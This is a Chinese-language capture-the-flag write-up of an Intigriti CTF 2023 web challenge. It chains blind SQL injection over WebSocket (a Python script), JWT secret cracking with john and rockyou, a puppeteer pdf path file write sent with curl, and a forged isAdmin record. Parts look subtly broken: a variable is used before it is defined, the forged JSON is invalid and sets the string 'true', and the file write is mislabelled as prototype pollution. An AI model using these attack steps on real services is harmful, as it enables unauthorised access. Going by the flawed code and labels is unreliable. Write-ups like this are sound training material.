---
title: Intigriti CTF 2023 Writeup [WEB]
contest: Intigriti CTF 2023
year: 2023
difficulty: hard
vuln_type: web_unknown
tags: [WebSocket_SQL盲注, JWT密钥爆破, Nodejs原型链污染, puppeteer_path注入, isAdmin权限绕过]
attack_chain:
  - WebSocket 注入：{"id":"11 and (SELECT substr(description,1,1)='A')"}
  - websockets sync client 爆破 flag 字符
  - JWT 爆破：jwt2john + rockyou
  - Nodejs 原型链污染：污染 userData 写 isAdmin: true
  - puppeteer path 注入：userOptions.path=/app/data/test.json 写恶意 JSON
  - 写 {username, firstName, lastName, spotifyTrackCode, isAdmin: true} 覆盖 isAdmin
  - 访问 /admin 路由拿 flag
key_payload: 'isAdmin: true 写 userData'
one_liner: Intigriti CTF 2023：WebSocket 盲注+JWT 爆破+原型链污染+puppeteer path 注入。
lesson: puppeteer page.pdf() 的 path 选项可控可写文件；JSON 写入可污染 isAdmin 字段。
quality: high
---

# Intigriti CTF 2023 Writeup [WEB]

## 来源
- 原文：ctfiot.com/146540.html
- 比赛：Intigriti CTF 2023

## 攻击链

### 1. WebSocket SQL 盲注
```python
import string, base64
from websockets.sync.client import connect

def sqli(ws, q_left, chars):
    data = """{"id":"11 and (%s='%s')"}""" % (q_left, chars)
    ws.send(data)
    return "Open" in ws.recv()

with connect("wss://bountyrepo.ctf.intigriti.io/ws") as ws:
    sql_template = "SELECT substr(description, %s, 1)"
    i = 1
    while True:
        for chars in string.printable:
            if sqli(ws, sql_template%i, chars):
                dumped += chars
                break
        i += 1
```

### 2. JWT 密钥爆破
```bash
./jwt2john.py "eyJ..." > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

### 3. Nodejs 原型链污染
- `/app/services/user.js` 写 user JSON
- `/app/middleware/check_admin.js` 验证 `userData.isAdmin === true`
- 注册时 userData 只有 username/firstName/lastName，无 isAdmin
- 利用 puppeteer path 注入写恶意 JSON

### 4. puppeteer path 注入
```bash
curl -k -X POST -H 'Content-Type: application/json' \
  -b 'login_hash=f024b76b41f9dba21cf620484862e9b90465d8db09ea946fb04a0f6f3876103a' \
  https://mymusic.ctf.intigriti.io/profile/generate-profile-card \
  -d '{"userOptions":{"path":"/app/data/test.json"}}'
```

### 5. 写恶意 JSON
```json
{'username':'a','firstName':'a','lastName':'b','spotifyTrackCode':'c','isAdmin':'true'}
```

### 6. 访问 /admin
```js
router.get('/admin', isAdmin, (req, res) => {
    res.render('admin', { flag: process.env.FLAG || 'CTF{DUMMY}' })
})
```

## 关键技巧
- **WebSocket 注入**：与 HTTP 注入同样原理，只是协议换 WebSocket
- **JWT 爆破**：jwt2john + rockyou 字典
- **puppeteer path 注入**：page.pdf() 的 path 选项可控可写文件
- **JSON 字段污染**：写入 isAdmin 字段绕过中间件检查

## 适用场景
- WebSocket SQL 注入
- JWT 弱密钥
- Nodejs 原型链污染
- puppeteer 命令注入
